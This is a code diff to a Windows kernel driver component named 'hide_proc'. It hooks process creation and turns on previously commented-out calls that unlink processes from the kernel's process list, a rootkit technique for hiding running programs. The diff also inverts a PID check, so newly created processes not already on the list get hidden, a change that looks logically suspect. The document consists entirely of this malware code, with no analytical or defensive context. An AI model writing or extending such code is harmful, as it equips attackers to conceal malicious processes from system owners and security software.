@@ -10,6 +10,7 @@ namespace hide_proc
 		kProcIdMutex.Create();
 		kProcImageMutex.Create();
 		NTSTATUS status;
+
 		status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&hide_proc::ProcessNotifyCallBack, FALSE);
 		if (STATUS_SUCCESS != status)
 		{
@@ -168,26 +169,24 @@ namespace hide_proc
 			}
 			
 			String<WCHAR> process_image_name(*(create_info)->ImageFileName);
-			DebugMessage("Real: %ws", process_image_name.Data());
 			if (String<WCHAR>(L"\\??\\").IsPrefixOf(process_image_name))
 			{
 				process_image_name = &process_image_name[String<WCHAR>(L"\\??\\").Size()];
 			}
-			DebugMessage("Real: %ws", process_image_name.Data());
+			DebugMessage("Real %lld: %ws", pid, process_image_name.Data());
 
 			size_t index = GetIndexInHiddenProcIdList(pid);
-			if (index != -1)
+			if (index == -1)
 			{
-				DebugMessage("Wtf1");
-				//(*kHideProcIdList)[index].DetachFromProcessList();
+				AddProcIdToHideList(pid);
+				(*kHideProcIdList)[(*kHideProcIdList).Size() - 1].DetachFromProcessList();
 				return;
 			}
 			index = GetIndexInHiddenProcImageList(&process_image_name);
-			if (index == -1)
+			if (index != -1)
 			{
-				DebugMessage("Wtf2");
 				AddProcIdToHideList(pid);
-				//(*kHideProcIdList)[(*kHideProcIdList).Size()-1].DetachFromProcessList();
+				(*kHideProcIdList)[(*kHideProcIdList).Size()-1].DetachFromProcessList();
 				return;
 			}
 		}
@@ -195,8 +194,7 @@ namespace hide_proc
 		{
 			if (GetIndexInHiddenProcIdList(pid))
 			{
-				DebugMessage("Wtf3");
-				//DeleteProcIdFromHideList(pid);
+				DeleteProcIdFromHideList(pid);
 			}
 		}
 	}
